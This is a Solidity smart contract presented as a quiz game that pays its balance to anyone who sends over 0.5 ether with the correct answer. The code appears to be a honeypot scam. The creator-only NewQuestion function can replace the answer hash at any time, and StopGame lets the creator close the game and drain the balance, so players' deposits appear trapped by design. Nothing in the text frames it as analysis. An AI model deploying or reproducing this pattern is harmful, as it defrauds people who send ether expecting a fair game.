1 pragma solidity ^0.4.20;
2 
3 contract QuizGame
4 {
5     function Play(string _response)
6     external
7     payable
8     {
9         require(msg.sender == tx.origin);
10         if(responseHash == keccak256(_response) && msg.value>0.5 ether && !closed)
11         {
12             msg.sender.transfer(this.balance);
13             GiftHasBeenSent();
14         }
15     }
16 
17 
18     string public question;
19 
20     address questionSender;
21 
22     bool public closed = false;
23 
24     bytes32 responseHash;
25 
26     function StartGame(string _question,string _response)
27     public
28     payable
29     {
30         if(responseHash==0x0)
31         {
32             responseHash = keccak256(_response);
33             question = _question;
34             questionSender = msg.sender;
35         }
36     }
37 
38     function StopGame()
39     public
40     payable
41     {
42        require(msg.sender == questionSender);
43        if (closed){
44            msg.sender.transfer(this.balance);
45        }else{
46            closed = true;
47        }
48     }
49 
50     function NewQuestion(string _question, bytes32 _responseHash)
51     public
52     payable
53     {
54         require(msg.sender == questionSender);
55         question = _question;
56         responseHash = _responseHash;
57     }
58 
59     function GiftHasBeenSent()
60     private
61     {
62         closed = true;
63     }
64 
65     function() public payable{}
66 }